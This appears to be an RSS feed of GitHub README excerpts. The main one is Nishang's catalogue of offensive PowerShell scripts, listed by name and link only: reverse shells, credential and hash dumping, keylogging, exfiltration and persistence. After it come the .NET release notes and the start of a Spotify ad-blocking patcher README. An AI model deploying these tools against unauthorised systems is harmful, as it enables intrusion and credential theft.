&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Remove-Update.ps1&quot;&gt;Remove-Update&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Introduce vulnerabilities by removing patches.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Invoke-PsUACme.ps1&quot;&gt;Invoke-PsUACme&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Bypass UAC.&lt;/p&gt; 
&lt;h4&gt;Execution&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download-Execute-PS.ps1&quot;&gt;Download-Execute-PS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Download and execute a PowerShell script in memory.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download_Execute.ps1&quot;&gt;Download_Execute&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Download an executable in text format, convert it to an executable, and execute.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-Command-MSSQL.ps1&quot;&gt;Execute-Command-MSSQL&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-DNSTXT-Code.ps1&quot;&gt;Execute-DNSTXT-Code&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute shellcode in memory using DNS TXT queries.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Out-RundllCommand.ps1&quot;&gt;Out-RundllCommand&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.&lt;/p&gt; 
&lt;h4&gt;Gather&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Check-VM.ps1&quot;&gt;Check-VM&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check for a virtual machine.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Copy-VSS.ps1&quot;&gt;Copy-VSS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Copy the SAM file using Volume Shadow Copy Service.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Credentials.ps1&quot;&gt;Invoke-CredentialsPhish&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Trick a user into giving credentials in plain text.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireBuster.ps1&quot;&gt;FireBuster&lt;/a&gt; &lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireListener.ps1&quot;&gt;FireListener&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A pair of scripts for egress testing&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-Information.ps1&quot;&gt;Get-Information&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get juicy information from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-LSASecret.ps1&quot;&gt;Get-LSASecret&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get LSA Secret from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHashes.ps1&quot;&gt;Get-PassHashes&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get password hashes from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-WLAN-Keys.ps1&quot;&gt;Get-WLAN-Keys&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get WLAN keys in plain text from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Keylogger.ps1&quot;&gt;Keylogger&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Log keystrokes from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1&quot;&gt;Invoke-MimikatzWdigestDowngrade&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Dump user passwords in plain on Windows 8.1 and Server 2012&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHints.ps1&quot;&gt;Get-PassHints&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get password hints of Windows users from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Show-TargetScreen.ps1&quot;&gt;Show-TargetScreen&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Connect back and Stream target screen using MJPEG.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1&quot;&gt;Invoke-Mimikatz&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Load mimikatz in memory. Updated and with some customisation.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikittenz.ps1&quot;&gt;Invoke-Mimikittenz&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Extract juicy information from target process (like browsers) memory using regex.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SSIDExfil.ps1&quot;&gt;Invoke-SSIDExfil&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Exfiltrate information like user credentials, using WLAN SSID.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SessionGopher.ps1&quot;&gt;Invoke-SessionGopher&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Identify admin jump-boxes and/or computers used to access Unix machines.&lt;/p&gt; 
&lt;h4&gt;MITM&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/MITM/Invoke-Interceptor.ps1&quot;&gt;Invoke-Interceptor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A local HTTPS proxy for MITM attacks.&lt;/p&gt; 
&lt;h4&gt;Pivot&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Create-MultipleSessions.ps1&quot;&gt;Create-MultipleSessions&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check credentials on multiple computers and create PSSessions.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Run-EXEonRemote.ps1&quot;&gt;Run-EXEonRemote&lt;/a&gt; Copy and execute an executable on multiple machines.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Invoke-NetworkRelay.ps1&quot;&gt;Invoke-NetworkRelay&lt;/a&gt; Create network relays between computers.&lt;/p&gt; 
&lt;h4&gt;Prasadhak&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Prasadhak/Prasadhak.ps1&quot;&gt;Prasadhak&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check running hashes of running process against the VirusTotal database.&lt;/p&gt; 
&lt;h4&gt;Scan&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Brute-Force.ps1&quot;&gt;Brute-Force&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Brute force FTP, Active Directory, MSSQL, and Sharepoint.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Port-Scan.ps1&quot;&gt;Port-Scan&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A handy port scanner.&lt;/p&gt; 
&lt;h4&gt;Powerpreter&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/powerpreter&quot;&gt;Powerpreter&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;All the functionality of nishang in a single script module.&lt;/p&gt; 
&lt;h4&gt;Shells&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcat.ps1&quot;&gt;Invoke-PsGcat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcatAgent.ps1&quot;&gt;Invoke-PsGcatAgent&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute commands and scripts sent by Invoke-PsGcat.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;Invoke-PowerShellTcp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse connect or bind shell&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLine.ps1&quot;&gt;Invoke-PowerShellTcpOneLine&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1&quot;&gt;Invoke-PowerShellTcpOneLineBind&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Bind version of Invoke-PowerShellTcpOneLine.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdp.ps1&quot;&gt;Invoke-PowerShellUdp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse connect or bind shell over UDP&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdpOneLine.ps1&quot;&gt;Invoke-PowerShellUdpOneLine&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Stripped down version of Invoke-PowerShellUdp.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttps.ps1&quot;&gt;Invoke-PoshRatHttps&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Reverse interactive PowerShell over HTTPS.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttp.ps1&quot;&gt;Invoke-PoshRatHttp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Reverse interactive PowerShell over HTTP.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Remove-PoshRat.ps1&quot;&gt;Remove-PoshRat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Clean the system after using Invoke-PoshRatHttps&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellWmi.ps1&quot;&gt;Invoke-PowerShellWmi&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Interactive PowerShell using WMI.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowerShellIcmp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over ICMP.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRundll.ps1&quot;&gt;Invoke-JSRatRundll&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over HTTP using rundll32.exe.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRegsvr.ps1&quot;&gt;Invoke-JSRatRegsvr&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over HTTP using regsvr32.exe.&lt;/p&gt; 
&lt;h4&gt;Utility&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Exfiltration.ps1&quot;&gt;Add-Exfiltration&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Persistence.ps1&quot;&gt;Add-Persistence&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Add reboot persistence capability to a script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Remove-Persistence.ps1&quot;&gt;Remove-Persistence&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Remote persistence added by the Add-Persistence script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Do-Exfiltration.ps1&quot;&gt;Do-Exfiltration&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Pipe (|) this to any script to exfiltrate the output.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Download.ps1&quot;&gt;Download&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Transfer a file to the target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Parse_Keys.ps1&quot;&gt;Parse_Keys&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Parse keys logged by the keylogger.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Encode&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Encode and compress a script or string.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Decode&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Decode and decompress a script or string from Invoke-Encode.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Start-CaptureServer.ps1&quot;&gt;Start-CaptureServer&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Run a web server which logs Basic authentication and SMB hashes.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/ConvertTo-ROT13.ps1&quot;&gt;ConvertTo-ROT13&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Encode a string to ROT13 or decode a ROT13 string.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Out-DnsTxt.ps1&quot;&gt;Out-DnsTxt&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Generate DNS TXT records which could be used with other scripts.&lt;/p&gt; 
&lt;p&gt;[Base64ToString]&lt;/p&gt; 
&lt;p&gt;[StringToBase64]&lt;/p&gt; 
&lt;p&gt;[ExetoText]&lt;/p&gt; 
&lt;p&gt;[TexttoExe]&lt;/p&gt; 
&lt;h3&gt;Updates&lt;/h3&gt; 
&lt;p&gt;Updates about Nishang can be found at my blog &lt;a href=&quot;http://labofapenetrationtester.com&quot;&gt;http://labofapenetrationtester.com&lt;/a&gt; and my Twitter feed @nikhil_mitt.&lt;/p&gt; 
&lt;h3&gt;Bugs, Feedback and Feature Requests&lt;/h3&gt; 
&lt;p&gt;Please raise an issue if you encounter a bug or have a feature request. You can email me at nikhil [dot] uitrgpv at gmail.com&lt;/p&gt; 
&lt;h4&gt;Mailing List&lt;/h4&gt; 
&lt;p&gt;For feedback, discussions, and feature requests, join: &lt;a href=&quot;http://groups.google.com/group/nishang-users&quot;&gt;http://groups.google.com/group/nishang-users&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Contributing&lt;/h4&gt; 
&lt;p&gt;I am always looking for contributors to Nishang. Please submit requests or drop me an email.&lt;/p&gt; 
&lt;h4&gt;Blog Posts&lt;/h4&gt; 
&lt;p&gt;Some helpful blog posts to check out for beginners:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&quot;&gt;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&quot;&gt;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&quot;&gt;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&quot;&gt;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;All posts about Nishang:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/search/label/Nishang&quot;&gt;http://www.labofapenetrationtester.com/search/label/Nishang&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dotnet/core</title>
      <link>https://github.com/dotnet/core</link>
      <description>&lt;p&gt;.NET news, announcements, release notes, and more!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET Release Notes&lt;/h1&gt; 
&lt;p&gt;Welcome to the home of .NET &lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/README.md&quot;&gt;release notes&lt;/a&gt; and &lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news&quot;&gt;news&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Releases&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/releases.md&quot;&gt;Releases&lt;/a&gt; under active support or development:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;left&quot;&gt;Version&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Release Date&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Release type&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Support phase&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Latest Patch Version&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;End of Support&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/10.0/README.md&quot;&gt;.NET 10.0&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;November 11, 2025&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;LTS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Preview&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/10.0/preview/preview7/10.0.0-preview.7.md&quot;&gt;10.0.0-preview.7&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;TBD&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/9.0/README.md&quot;&gt;.NET 9.0&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/dotnet/announcing-dotnet-9/&quot;&gt;November 12, 2024&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;STS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Active&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/9.0/9.0.8/9.0.8.md&quot;&gt;9.0.8&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;May 12, 2026&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/8.0/README.md&quot;&gt;.NET 8.0&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/dotnet/announcing-dotnet-8/&quot;&gt;November 14, 2023&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;LTS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Active&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/8.0/8.0.19/8.0.19.md&quot;&gt;8.0.19&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;November 10, 2026&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/README.md&quot;&gt;Release notes&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://dotnet.microsoft.com/download/dotnet&quot;&gt;Binaries and installers&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/dotnet/core/install/&quot;&gt;Installation docs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/dotnet/core/tools/dotnet-install-script&quot;&gt;dotnet-install scripts&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Discussions&lt;/h2&gt; 
&lt;p&gt;Follow &lt;a href=&quot;https://github.com/dotnet/core/discussions&quot;&gt;GitHub Discussions&lt;/a&gt;, where you will find the latest news on releases, including PSAs and CVEs.&lt;/p&gt; 
&lt;p&gt;You can subscribe to discussions with the following RSS feeds:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Category&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;GitHub Discussions&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;RSS Feed&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;All Discussions&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;News&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;General&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/general&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/general.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt;</description>
    </item>
    
    <item>
      <title>SpotX-Official/SpotX</title>
      <link>https://github.com/SpotX-Official/SpotX</link>
      <description>&lt;p&gt;SpotX patcher used for patching the desktop version of Spotify&lt;/p&gt;&lt;hr&gt;&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/releases&quot;&gt;&lt;img src=&quot;https://spotx-official.github.io/images/logos/logo.png&quot; /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://t.me/spotify_windows_mod&quot;&gt;&lt;img src=&quot;https://spotx-official.github.io/images/shields/SpotX_Channel.svg?sanitize=true&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://t.me/SpotxCommunity&quot;&gt;&lt;img src=&quot;https://spotx-official.github.io/images/shields/SpotX_Community.svg?sanitize=true&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/SpotX-Official/SpotX-Bash&quot;&gt;&lt;img src=&quot;https://spotx-official.github.io/images/shields/SpotX_for_Mac&amp;amp;Linux.svg?sanitize=true&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://telegra.ph/SpotX-FAQ-09-19&quot;&gt;&lt;img src=&quot;https://spotx-official.github.io/images/shields/faq.svg?sanitize=true&quot; /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;h2&gt; 
 &lt;div align=&quot;center&quot;&gt;
  &lt;b&gt; Patcher for Spotify Desktop Client on Windows &lt;/b&gt;
 &lt;/div&gt; &lt;/h2&gt; 
&lt;p align=&quot;center&quot;&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#requirements&quot;&gt;Requirements&lt;/a&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#features&quot;&gt;Features&lt;/a&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#installation--update&quot;&gt;Installation&lt;/a&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#uninstall&quot;&gt;Uninstall&lt;/a&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#faq&quot;&gt;FAQ&lt;/a&gt; • &lt;a href=&quot;https://raw.githubusercontent.com/SpotX-Official/SpotX/main/#disclaimer&quot;&gt;Disclaimer&lt;/a&gt; &lt;/p&gt; 
&lt;h1 id=&quot;requirements&quot;&gt;Requirements&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;OS:&lt;/strong&gt; Windows 7-11&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Spotify:&lt;/strong&gt; &lt;a href=&quot;https://loadspot.pages.dev&quot;&gt;1.2.68 and below&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;For Windows Desktop only&lt;/strong&gt; (Microsoft Store version is not suitable)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;PowerShell:&lt;/strong&gt; Version 5 and above recommended&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1 id=&quot;features&quot;&gt;Features&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Blocks all banner, video, and audio ads&lt;/strong&gt; in the client&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Hiding podcasts, episodes, and audiobooks&lt;/strong&gt; from the homepage (optional)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Block Spotify automatic updates&lt;/strong&gt; (optional)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;More experimental features have been activated&lt;/strong&gt; (&lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50&quot;&gt;see the full list&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Disabled Sentry&#39;s console log/error/warning messages&lt;/strong&gt; to Spotify developers, halted user interaction logging, and performed code minification&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1 id=&quot;installation--update&quot;&gt;Installation / Update&lt;/h1&gt; 
&lt;h3&gt;Choose installation type:&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;small&gt;Usual installation (New theme)&lt;/small&gt;&lt;/summary&gt;
